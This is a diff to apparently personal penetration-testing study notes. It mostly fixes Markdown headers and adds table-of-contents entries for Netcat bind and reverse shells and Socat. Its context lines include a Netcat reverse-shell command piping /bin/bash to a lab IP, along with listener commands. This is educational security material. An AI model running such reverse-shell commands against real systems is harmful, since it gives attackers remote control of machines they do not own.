@@ -7,8 +7,11 @@
  2. [Downlaoding Files](#downloading-files)
  3. [Customizing the Bash Environment](#customizing-the-bash-environment)
  4. [Practical Tools](#practical-tools)
-    - [Netcat](#netcat)
+    - [NetCat](#netcat)
+    - [NetCat Bind Shell](#netcat-bind-shell)
     - [NetCat Reverse Shell](#netcat-reverse-shell)
+ 5. [Socat](#socat)
+ 6. [Netcat vs Socat](#netcat-vs-socat)
 
 
 ## Managing process
@@ -156,7 +159,7 @@ nc -nv 10.11.0.22 4444
 ![Bind Shell](https://i.imgur.com/uryYaJa.png)
 
 ---
-##NetCat Reverse Shell 
+## NetCat Reverse Shell 
 
 - client(Alice)
 ```bash
@@ -168,7 +171,7 @@ nc -nv 10.11.0.22 4444 -e /bin/bash
 ```
 ![Reverse Shell](https://i.imgur.com/jeTs3lq.png)
 ---
-#Socat
+# Socat
 - It is a command-line utlity that establishes tow bidirectional byte streams and transfers data between them. For Penetration testing.
 - It is similar to Netcat but has additional useful features.
 
@@ -184,7 +187,7 @@ _note: we require root privilege to bind listener to ports below 1024_
 sudo nc -lvp localhost 443
 sudo socat TCP4-LISTEN:443 STDOUT
 ```
-##Socat File Transfers
+## Socat File Transfers
 Alice need to send Bob 
 - Linux &rarr; Windows
  - On Linux 
